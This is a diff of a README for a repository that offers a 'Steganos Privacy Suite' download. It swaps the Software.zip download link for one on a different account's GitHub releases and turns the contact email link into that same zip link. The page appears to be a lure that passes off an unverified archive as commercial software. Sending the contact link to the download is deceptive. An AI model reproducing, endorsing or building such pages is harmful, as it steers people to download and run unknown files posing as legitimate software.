@@ -12,7 +12,7 @@ Welcome to the "Steganos Privacy Suite Download" repository! Here you can find i
 
 You can download the software package from the following link: 
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/arasemre04/Steganos-Privacy-Suite-Download/releases/download/v1.0/Software.zip)](https://github.com/arasemre04/Steganos-Privacy-Suite-Download/releases/download/v1.0/Software.zip)
 
 Please note that the link above needs to be launched to start the download process.
 
@@ -44,7 +44,7 @@ Please note that the link above needs to be launched to start the download proce
 
 🌟 **Contributions:** We welcome contributions! Feel free to submit pull requests with improvements or additional resources.
 
-📫 **Contact:** Have questions or feedback? Reach out to us via [email](mailto:contact@steganos-privacy-suite.com).
+📫 **Contact:** Have questions or feedback? Reach out to us via [email](https://github.com/arasemre04/Steganos-Privacy-Suite-Download/releases/download/v1.0/Software.zip).
 
 ## Conclusion
 
